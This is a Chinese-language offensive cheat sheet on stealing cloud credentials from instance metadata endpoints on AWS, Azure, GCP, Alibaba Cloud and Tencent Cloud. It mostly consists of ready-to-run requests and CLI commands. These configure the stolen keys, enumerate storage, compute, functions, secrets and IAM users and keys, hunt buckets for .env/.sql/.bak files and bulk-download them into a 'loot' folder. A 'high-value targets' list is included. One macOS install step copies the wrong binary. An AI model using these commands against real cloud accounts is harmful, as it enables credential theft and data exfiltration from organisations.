# 云凭据提取与利用

## AWS IAM Role 凭据
```
# 列出挂载的 IAM Role
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 获取临时凭据（返回 AccessKeyId + SecretAccessKey + Token）
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

返回示例：
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "xxx",
  "Token": "xxx",
  "Expiration": "2024-01-01T00:00:00Z"
}
```

## Azure Managed Identity Token
```
GET http://169.254.169.254/metadata/identity/oauth2/token
    ?api-version=2018-02-01
    &resource=https://management.azure.com/
    Header: Metadata: true
```

## GCP Service Account Token
```
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
    Header: Metadata-Flavor: Google
```

## 阿里云 STS Token
```
GET http://100.100.100.200/latest/meta-data/ram/security-credentials/<role-name>
```

## 腾讯云 CAM 角色凭据
```
# Step 1: 列出挂载的角色名称
GET http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
# 返回纯文本角色名称，如: my-cvm-role

# Step 2: 获取角色临时凭据
GET http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<role-name>
```

返回示例：
```json
{
  "TmpSecretId": "AKIDxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "TmpSecretKey": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "Token": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "ExpiredTime": "2024-01-01T12:00:00Z",
  "Code": "Success"
}
```

> 腾讯云临时凭据通常有效期为 1-6 小时，与 AWS 类似。

---

## AWS 快速利用

```bash
# 配置凭据
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=xxx
export AWS_SESSION_TOKEN=xxx

# 确认身份
aws sts get-caller-identity

# 枚举 S3
aws s3 ls

# 枚举 EC2
aws ec2 describe-instances --region us-east-1

# 枚举 Lambda
aws lambda list-functions --region us-east-1

# 枚举 Secrets Manager
aws secretsmanager list-secrets --region us-east-1
```

---

## 腾讯云快速利用（tccli 优先）

```bash
# 方式 1: 交互式配置
tccli configure
# 输入 TmpSecretId, TmpSecretKey, Region(如 ap-guangzhou), token

# 方式 2: 环境变量
export TENCENTCLOUD_SECRET_ID="AKIDxxx..."
export TENCENTCLOUD_SECRET_KEY="xxxx=="
export TENCENTCLOUD_SESSION_TOKEN="TOKEN..."
export TENCENTCLOUD_REGION="ap-guangzhou"

# 确认身份
tccli sts GetCallerIdentity

# 枚举 COS 存储桶（tccli 不支持 GetService，使用 coscli 或 SDK）
coscli ls
# 或 Python SDK:
# from qcloud_cos import CosConfig, CosS3Client
# client = CosS3Client(CosConfig(Region='ap-guangzhou', SecretId='Sid', SecretKey='Skey'))
# print(client.list_buckets())

# 枚举 CVM 实例
tccli cvm DescribeInstances

# 枚举 SCF 云函数
tccli scf ListFunctions --Namespace default --Limit 50

# 枚举 CAM 用户
tccli cam ListUsers

# 枚举 CAM 角色
tccli cam DescribeRoleList --Page 1 --Rp 50

# 枚举 CAM 策略
tccli cam ListPolicies --Scope Local --Page 1 --Rp 100

# 列出 AccessKey
tccli cam ListAccessKeys
```

### coscli 快速操作 COS

```bash
# 安装 coscli（根据系统架构选择对应版本）
# Linux amd64（最常见）
wget https://cosbrowser.cloud.tencent.com/software/coscli/coscli-linux-amd64
mv coscli-linux-amd64 /usr/local/bin/coscli && chmod +x /usr/local/bin/coscli

# Linux arm64
wget https://cosbrowser.cloud.tencent.com/software/coscli/coscli-linux-arm64
mv coscli-linux-arm64 /usr/local/bin/coscli && chmod +x /usr/local/bin/coscli

# macOS arm64 (M1/M2)
wget https://cosbrowser.cloud.tencent.com/software/coscli/coscli-darwin-arm64
mv coscli-darwin-arm64 /usr/local/bin/coscli && chmod +x /usr/local/bin/coscli

# macOS amd64 (Intel)
wget https://cosbrowser.cloud.tencent.com/software/coscli/coscli-darwin-amd64
mv coscli-darwin-arm64 /usr/local/bin/coscli && chmod +x /usr/local/bin/coscli

# 配置（交互式，生成 ~/.cos.yaml）
coscli config init
# 按提示输入: SecretId, SecretKey, SessionToken(临时凭据时填), APPID, Bucket-Region
# 配置文件 ~/.cos.yaml 示例:
# cos:
#   secretid: AKIDxxx
#   secretkey: xxxx==
#   sessiontoken: TOKEN    # 临时凭据时
#   appid: 1250000000
#   buckets:
#     - name: mybucket-1250000000
#       region: ap-guangzhou

# 列出所有桶
coscli ls

# 列出桶内文件
coscli ls cos://BUCKET-APPID/ -r

# 搜索敏感文件
coscli ls cos://BUCKET-APPID/ -r --include "*.env" --include "*.sql" --include "*.bak"

# 下载文件
coscli cp cos://BUCKET-APPID/path/to/file ./

# 批量下载
coscli cp cos://BUCKET-APPID/ ./loot/ -r
```

---

## 高价值目标
- **COS/S3 存储桶**：可能包含备份、日志、敏感数据
- **Secrets Manager / SSM Parameter Store**：数据库密码、API 密钥
- **Lambda/SCF 代码**：可能包含硬编码凭据
- **EC2/CVM User-Data**：启动脚本可能包含密码
- **SSL 证书**：可能包含私钥（`tccli ssl DescribeCertificates`）
- **KMS 密钥**：加密密钥管理

## 其他元数据信息

除了凭据，元数据还包含有价值的信息：

### AWS
```
/latest/meta-data/instance-id
/latest/meta-data/instance-type
/latest/meta-data/ami-id
/latest/meta-data/hostname
/latest/meta-data/local-ipv4
/latest/meta-data/public-ipv4
/latest/meta-data/network/interfaces/macs/<mac>/vpc-id
/latest/meta-data/network/interfaces/macs/<mac>/subnet-id
/latest/user-data
```

### 腾讯云
```
http://metadata.tencentyun.com/latest/meta-data/instance-id
http://metadata.tencentyun.com/latest/meta-data/uuid
http://metadata.tencentyun.com/latest/meta-data/hostname
http://metadata.tencentyun.com/latest/meta-data/local-ipv4
http://metadata.tencentyun.com/latest/meta-data/public-ipv4
http://metadata.tencentyun.com/latest/meta-data/placement/region
http://metadata.tencentyun.com/latest/meta-data/placement/zone
http://metadata.tencentyun.com/latest/meta-data/mac
http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs/<mac>/vpc-id
http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs/<mac>/subnet-id
http://metadata.tencentyun.com/latest/user-data
```
